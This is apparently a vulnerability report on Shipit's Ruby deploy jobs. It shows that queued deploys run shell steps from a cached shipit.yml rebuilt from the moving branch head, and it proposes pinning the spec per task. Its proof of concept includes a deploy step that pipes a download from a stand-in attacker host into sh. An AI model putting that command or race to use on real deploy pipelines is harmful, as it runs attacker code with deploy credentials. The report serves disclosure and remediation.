### Title
Deploy execution runs shell steps from a stale cached `shipit.yml` instead of the reviewed commit's own config, letting a re-pushed HEAD hijack an already-queued deploy - ([File: app/jobs/shipit/cache_deploy_spec_job.rb])

### Summary
Shipit decouples "which commit's code is checked out for a deploy" from "which commit's `shipit.yml` steps are executed for that deploy." The former is `Task#until_commit`, fetched and checked out at execution time. The latter is `Stack#cached_deploy_spec`, a serialized `DeploySpec` that is asynchronously rebuilt from whatever commit is `stack.commits.reachable.last` *at the moment `CacheDeploySpecJob` runs* — not from `until_commit`. Between the time a deploy is queued for commit A and the time it actually executes, a new commit B can land on the branch, `GithubSyncJob`/`CacheDeploySpecJob` can recompute `cached_deploy_spec` from B's `shipit.yml`, and the deploy for A will run B's `deploy.override` shell commands against a checkout of A. This is a time-of-check/time-of-use gap between the ref that was approved/queued for deploy and the ref whose `shipit.yml` steps actually execute — structurally the same class of bug as the flash-mint report (a value used for a privileged computation is read from mutable, attacker-influenced state instead of the state that was actually checked/approved).

### Finding Description
- `DeployCommands#steps` returns `deploy_spec.deploy_steps!`, and `deploy_spec` resolves to `@stack.cached_deploy_spec` (via `TaskCommands`), i.e., the stack's cached config, not any config tied to the specific task/commit. [1](#0-0) 
- `Stack#cached_deploy_spec` is populated by `CacheDeploySpecJob`, which checks out `stack.commits.reachable.last` — the current branch head at job execution time — builds a `DeploySpec::FileSystem` from it, and persists it on the stack: [2](#0-1) 
- `GithubSyncJob` re-enqueues `CacheDeploySpecJob` every time new commits are synced from GitHub, so the cached spec tracks the moving branch head, independent of any specific deploy's target commit: [3](#0-2) 
- When a deploy actually runs, `TaskExecutionStrategy::Default#checkout_repository` fetches and checks out `@task.until_commit` — the commit that was chosen (and presumably reviewed/CI-validated) when the deploy was triggered: [4](#0-3) 
- But the shell commands actually executed (`@commands.perform`, i.e. `DeployCommands#steps` / `deploy.override`) come from the *stack's currently cached* `DeploySpec`, which may have been rebuilt from a completely different, later commit if the branch advanced while the deploy was queued or running: [5](#0-4) [6](#0-5) 

The binding that is broken:
`ref(until_commit checked out) == ref(shipit.yml whose deploy/rollback/task steps are executed)`
is not actually enforced. In practice the right side is `ref(stack.commits.reachable.last at the time CacheDeploySpecJob last ran)`, a value that can move independently of, and later than, `until_commit`.

### Impact Explanation
Because `deploy.override`/`deploy.pre`/`deploy.post` (and `rollback`, `fetch`, `tasks`) steps in `shipit.yml` are literal shell command strings executed on the deploy host with the app's deploy environment (`SHIPIT`, `GITHUB_TOKEN`-adjacent deploy credentials, SSH keys, cloud credentials, etc. — see `machine.environment`/`env` script parameters), any actor able to land a new commit on the tracked branch after a deploy has been queued but before it runs can substitute arbitrary shell commands into that in-flight, already-authorized deploy. This effectively grants unauthorized command execution on the deploy host and an unauthorized deploy of unreviewed content, because the commands run under the authority granted to the queued deploy of commit A, while their content is drawn from commit B, which never went through the same trigger/authorization path (e.g. it may not have passed CI, may not be `until_commit`'s reviewed diff, and may not even be deployed itself). This matches the "ref approved vs. ref whose `shipit.yml` steps execute" trust binding called out as in-scope, and its impact is command execution / an unauthorized deploy on the deploy host, i.e. Critical severity per the stated impact criteria.

### Likelihood Explanation
The window is not theoretical: `CacheDeploySpecJob` is deliberately asynchronous and can be re-enqueued and re-run for every incoming push (`GithubSyncJob`), while deploy execution (`PerformTaskJob`/`TaskExecutionStrategy::Default`) is itself queued and can be delayed by concurrency locks, job backlog, `acquire_git_cache_lock`, git fetch time, etc. Any contributor who can land commits on the tracked branch (the normal, expected way to interact with a continuously-delivered Shipit stack) can race a second push against an in-flight deploy to have their `shipit.yml` picked up before the deploy's `steps` are read, without needing any Shipit-specific credential, API token, or elevated Shipit role beyond what "get a commit onto the branch that Shipit syncs" already implies.

### Recommendation
Bind the deploy spec used for command execution to the exact commit being deployed, not to the mutable `stack.cached_deploy_spec`. Concretely: capture/pin a `DeploySpec` snapshot on the `Task`/`Deploy` record at the moment the task is built (from `until_commit`, matching how the code checkout is pinned), and have `TaskCommands#deploy_spec` read that per-task snapshot instead of `@stack.cached_deploy_spec`. If a stack-level cache is retained for display/UX purposes, it must never be the source of truth for the shell commands that are actually executed for a specific, already-approved commit.

### Proof of Concept
1. Stack `S` tracks branch `main`, continuous delivery enabled.
2. Contributor pushes commit `A` (`shipit.yml` unchanged, benign `deploy.override`). CI passes; Shipit's continuous delivery logic builds a `Deploy` with `until_commit = A` and enqueues it (`Stack#build_deploy` / `trigger_deploy`).
3. Before `PerformTaskJob` for this deploy actually reaches `checkout_repository`/`perform` (e.g., queue backlog, concurrent deploy lock, slow git fetch), the same contributor pushes commit `B` to `main` whose `shipit.yml` sets `deploy.override: ["curl attacker.example/x | sh"]`.
4. `GithubSyncJob` picks up `B`, appends it to `stack.commits`, and enqueues `CacheDeploySpecJob`, which checks out `B` (now `stack.commits.reachable.last`) and overwrites `stack.cached_deploy_spec` with `B`'s config (`app/jobs/shipit/cache_deploy_spec_job.rb:16-23`).
5. The still-pending deploy for `A` now runs: `checkout_repository` checks out `A`'s tree (`app/models/shipit/task_execution_strategy/default.rb:68-83`), but `perform_task`'s `@commands.perform` reads `deploy_spec.deploy_steps!` from `stack.cached_deploy_spec`, which is now `B`'s config (`lib/shipit/deploy_commands.rb:1-8`, `app/models/shipit/deploy_spec.rb:110-118`).
6. Result: the deploy host executes `curl attacker.example/x | sh` under the credentials/authority granted to the already-triggered deploy of `A`, even though `B` was never itself deployed or independently authorized for execution. [7](#0-6) [8](#0-7) [9](#0-8) [10](#0-9)

# frozen_string_literal: true

module Shipit
  class CacheDeploySpecJob < BackgroundJob
    include BackgroundJob::Unique
    on_duplicate :drop

    queue_as :deploys

    # Caps job execution AND sets the dedupe lock expiration to match.
    # Without it the lock falls back to Unique::DEFAULT_TIMEOUT (10s), which is
    # far shorter than the job's runtime, letting duplicate jobs for the same
    # stack run concurrently once the lock expires mid-run.
    self.timeout = 15.minutes.to_i

    def perform(stack)
      return if stack.inaccessible?

      commit = stack.commits.reachable.last
      commands = Commands.for(stack)
      commands.with_temporary_working_directory(commit:, recursive: false) do |path|
        stack.update!(cached_deploy_spec: DeploySpec::FileSystem.new(path, stack))
      end

      # A duplicate enqueued while this job held the dedupe lock was dropped;
      # if the head moved under us, that dropped job's work is still
      # outstanding, so hand it off rather than leaving the spec stale.
      CacheDeploySpecJob.perform_later(stack) if stack.commits.reachable.last&.id != commit&.id
    end
  end
end

module Shipit
  class GithubSyncJob < BackgroundJob
    include BackgroundJob::Unique

    attr_reader :stack

    MAX_FETCHED_COMMITS = 25
    MAX_RETRY_ATTEMPTS = 5
    RETRY_DELAY = 5.seconds
    queue_as :default
    on_duplicate :drop

    self.timeout = 60
    self.lock_timeout = 20

    def perform(params)
      @stack = Stack.find(params[:stack_id])
      expected_head_sha = params[:expected_head_sha]
      retry_count = params[:retry_count] || 0
      head_before_sync = spec_cache_target
      appended_commits = []

      handle_github_errors do
        new_commits, shared_parent = fetch_missing_commits { stack.github_commits }

        # Retry on Github eventual consistency: webhook indicated new commits but we found none
        if expected_head_sha && new_commits.empty? && !commit_exists?(expected_head_sha) &&
           retry_count < MAX_RETRY_ATTEMPTS
          GithubSyncJob.set(wait: RETRY_DELAY * retry_count).perform_later(params.merge(retry_count: retry_count + 1))
          return
        end

        stack.transaction do
          shared_parent&.detach_children!
          appended_commits = new_commits.map do |gh_commit|
            append_commit(gh_commit)
          end
          stack.lock_reverted_commits! if appended_commits.any?(&:revert?)
        end
      end
      sync_changed_nothing = appended_commits.empty? &&
                             spec_cache_target == head_before_sync &&
                             stack.cached_deploy_spec.present?
      return if sync_changed_nothing && !params[:force_spec_cache]

      CacheDeploySpecJob.perform_later(stack)
    end
